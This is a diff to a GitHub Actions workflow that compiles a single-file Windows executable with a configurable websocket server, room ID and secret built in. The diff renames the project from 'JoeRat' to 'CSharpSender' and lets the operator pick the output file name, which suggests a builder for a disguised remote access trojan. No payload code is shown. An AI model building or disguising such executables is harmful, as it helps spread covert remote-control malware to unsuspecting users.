@@ -15,6 +15,10 @@ on:
         description: 'Secret'
         required: true
         type: string
+      exe_name:
+        description: 'Executable Name'
+        required: true
+        type: string
 
 jobs:
   build:
@@ -32,25 +36,31 @@ jobs:
     - name: Update BuildConfig
       run: |
         $buildConfig = @"
-        namespace JoeRat;
+        namespace CSharpSender;
         internal static class BuildConfig
         {
             public const string DefaultWsUrl  = "${{ github.event.inputs.ws_url }}";
             public const string DefaultRoomId = "${{ github.event.inputs.room_id }}";
             public const string DefaultSecret = "${{ github.event.inputs.secret }}";
-            public const string ExeName       = "JoeRat";
+            public const string ExeName       = "${{ github.event.inputs.exe_name }}";
         }
         "@
         $buildConfig | Out-File -FilePath "csharpsender/CSharpSender/BuildConfig.cs" -Encoding UTF8
         
     - name: Restore dependencies
-      run: dotnet restore csharpsender/CSharpSender/JoeRat.csproj
+      run: dotnet restore csharpsender/CSharpSender/CSharpSender.csproj
       
     - name: Build
-      run: dotnet publish csharpsender/CSharpSender/JoeRat.csproj -c Release -o build --self-contained true -r win-x64 -p:PublishSingleFile=true
+      run: dotnet publish csharpsender/CSharpSender/CSharpSender.csproj -c Release -o build --self-contained true -r win-x64 -p:PublishSingleFile=true
       
+    - name: Rename executable
+      run: |
+        if (Test-Path "build/CSharpSender.exe") {
+          Rename-Item "build/CSharpSender.exe" "${{ github.event.inputs.exe_name }}.exe"
+        }
+        
     - name: Upload executable
       uses: actions/upload-artifact@v3
       with:
-        name: JoeRat
-        path: build/JoeRat.exe
+        name: ${{ github.event.inputs.exe_name }}
+        path: build/${{ github.event.inputs.exe_name }}.exe
